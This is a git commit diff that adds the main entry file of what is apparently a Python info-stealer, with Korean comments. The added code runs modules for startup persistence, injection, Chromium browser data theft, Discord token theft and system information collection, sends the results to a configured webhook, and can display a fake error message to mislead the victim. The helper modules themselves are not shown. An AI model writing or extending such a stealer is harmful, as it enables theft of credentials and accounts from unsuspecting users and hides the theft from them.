359ddda980642274feb68e89d0af49cd8e100943
Lier0102 <75836412+Lier0102@users.noreply.github.com>
2022-10-01 10:17:25 +0900

    틀 제작

--- MAIN/main.py
+++ MAIN/main.py
@@ -1,2 +1,34 @@
 # 맥에서 윈도우 python 코드를 작성하는 사람이 있다?
 # ㅋㅋㄹㅃㅃ
+from func.token import *
+from func.debug import *
+
+from config import __CONFIG__
+
+def main(webhook: str) -> None:
+    _exec_time = exec_time()
+
+    funcs = [ # 함수들을 쓰기 쉽게 리스팅 해놓기
+        debug,
+        startup,
+        injection,
+        chromium,
+        disctoken,
+        sysinfo,
+    ]
+
+    for func in funcs:
+        if __CONFIG__[func.__name__]:
+            if type(func) == type:
+                [func(webhook) if 'webhook' in func.__init__.__code__.co_varnames else func()]
+            else:
+                [func(webhook) if 'webhook' in func.__code__.co_varnames else func()]
+
+    _exec_time.stop()
+    _exec_time.send(webhook)
+
+    if __CONFIG__['fakeerror']['use']:
+        fake_error(__CONFIG__['fakeerror']['message'])
+
+if __name__ == "__main__":
+    main(__CONFIG__['webhook'])
